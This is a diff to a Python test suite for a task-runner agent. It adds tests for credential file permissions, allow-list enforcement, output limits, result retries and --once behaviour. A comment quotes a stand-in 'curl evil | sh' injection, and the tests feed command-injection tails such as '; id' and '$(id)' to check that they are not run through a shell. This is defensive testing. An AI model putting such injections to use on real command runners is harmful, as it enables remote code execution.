@@ -13,6 +13,7 @@ payload — which is where the contract with the daemon actually lives.
 """
 
 import json
+import os
 import subprocess
 import sys
 import tempfile
@@ -77,6 +78,14 @@ class StubDaemon(BaseHTTPRequestHandler):
             return
 
         if self.path.endswith("/result"):
+            s["result_attempts"] = s.get("result_attempts", 0) + 1
+            if s.get("reject_results"):
+                self._send(409, {"error": "this task is no longer yours"})
+                return
+            if s.get("fail_results", 0) > 0:
+                s["fail_results"] -= 1
+                self._send(503, {"error": "try again"})
+                return
             s["results"].append(body)
             self._send(204)
             return
@@ -127,6 +136,18 @@ class AgentTest(unittest.TestCase):
         self.register()
         mode = Path(self.cfg_path).stat().st_mode & 0o777
         self.assertEqual(mode, 0o600, f"credential saved {oct(mode)}")
+
+    def test_the_credential_is_never_briefly_world_readable(self):
+        # Writing it and chmod-ing on the next statement leaves a window in
+        # which anyone on the machine can read it, and the credential never
+        # rotates — whoever wins that race keeps it. Checked by writing under a
+        # permissive umask, which is what exposed the window.
+        old = os.umask(0o000)
+        self.addCleanup(os.umask, old)
+        path = Path(self.tmp.name) / "fresh" / "runner.json"
+        dzrunner.save_config(path, {"credential": "dzrc_secret"})
+        self.assertEqual(path.stat().st_mode & 0o777, 0o600)
+        self.assertEqual(path.parent.stat().st_mode & 0o777, 0o700)
 
     def test_second_run_reuses_the_saved_credential(self):
         self.register()
@@ -299,10 +320,89 @@ class AgentTest(unittest.TestCase):
 
     def test_no_allow_list_permits_everything(self):
         # The default, and the reason the agent warns about it on every start.
-        self.assertIsNone(dzrunner.permitted("anything at all", []))
+        command, use_shell, refusal = dzrunner.plan("anything at all", [])
+        self.assertIsNone(refusal)
+        self.assertTrue(use_shell, "with no allow-list the flow's command goes to a shell")
+        self.assertEqual(command, "anything at all")
 
     def test_an_empty_command_is_refused_when_restricted(self):
-        self.assertIn("empty", dzrunner.permitted("   ", ["ls"]))
+        self.assertIn("empty", dzrunner.plan("   ", ["ls"])[2])
+
+    def test_an_allow_list_is_not_defeated_by_a_semicolon(self):
+        # The documented hardening is `--allow ./fetch-invoices.sh`, and the
+        # docs promise the runner "will then refuse anything else". Checking
+        # the first word and then handing the string to a shell enforced
+        # nothing: anyone with graph:edit could append `; curl evil | sh`.
+        for tail in ("; id", "&& id", "| id", "$(id)", "`id`", "\nid"):
+            with self.subTest(tail=tail):
+                command, use_shell, refusal = dzrunner.plan("./ok.sh " + tail, ["./ok.sh"])
+                self.assertIsNone(refusal, "the allowed program is still allowed")
+                self.assertFalse(use_shell, "an allow-list means no shell, so this is not an operator")
+                self.assertEqual(command[0], "./ok.sh")
+                self.assertNotIn("id", command[:1])
+
+    def test_an_allow_list_runs_the_command_directly(self):
+        cfg = self.register()
+        # With a shell this would print "one" and then run `id`. Without one,
+        # the whole tail is arguments to echo.
+        self.state["queue"].append({"id": "t1", "script": "echo one; id"})
+        dzrunner.Agent(cfg, ["echo"]).run(once=True)
+        self.assertEqual(self.state["results"][0]["stdout"].strip(), "one; id")
+
+    def test_an_unparseable_command_is_refused_rather_than_guessed(self):
+        self.assertIn("could not read", dzrunner.plan('./ok.sh "unclosed', ["./ok.sh"])[2])
+
+    # ---- reporting back -----------------------------------------------
+
+    def test_output_larger_than_the_server_accepts_fails_the_step(self):
+        # The server rejects a body over its cap, and the agent used to only
+        # log that — so the task stranded and the step blamed a machine that
+        # was online and had finished in two seconds. Trimmed here instead,
+        # and failed rather than handed on: half a document that looks like a
+        # success is worse than an error naming the limit.
+        cfg = self.register()
+        n = dzrunner.MAX_OUTPUT_BYTES + 5000
+        self.state["queue"].append({"id": "t1", "script": f"head -c {n} /dev/zero | tr '\\0' x"})
+        dzrunner.Agent(cfg, []).run(once=True)
+        res = self.state["results"][0]
+        self.assertLessEqual(len(res["stdout"]), dzrunner.MAX_OUTPUT_BYTES)
+        self.assertIn("more than this runner can send back", res["error"])
+
+    def test_a_result_is_retried_through_a_transient_failure(self):
+        # The task is already done by this point, so giving up on the first
+        # dropped packet fails a step for nothing.
+        cfg = self.register()
+        self.state["fail_results"] = 2  # two 503s, then accept
+        self.state["queue"].append({"id": "t1", "script": "printf ok"})
+        agent = dzrunner.Agent(cfg, [])
+        agent._sleep = lambda _s: None  # no real backoff in a test
+        agent.run(once=True)
+        self.assertEqual(len(self.state["results"]), 1)
+        self.assertEqual(self.state["results"][0]["stdout"], "ok")
+
+    def test_a_refused_result_is_not_retried(self):
+        # A 4xx is the server refusing on the merits. Retrying changes nothing
+        # and only delays the agent's return to the queue.
+        cfg = self.register()
+        self.state["reject_results"] = True
+        self.state["queue"].append({"id": "t1", "script": "printf ok"})
+        agent = dzrunner.Agent(cfg, [])
+        agent._sleep = lambda _s: None
+        agent.run(once=True)
+        self.assertEqual(self.state.get("result_attempts"), 1)
+
+    def test_once_exits_on_an_empty_queue(self):
+        # "--once: run one task and exit, for testing". Waiting forever on an
+        # empty queue is the one thing it must not do.
+        cfg = self.register()
+        done = threading.Event()
+
+        def go():
+            dzrunner.Agent(cfg, []).run(once=True)
+            done.set()
+
+        threading.Thread(target=go, daemon=True).start()
+        self.assertTrue(done.wait(10), "--once hung on an empty queue")
 
     # ---- names --------------------------------------------------------
 
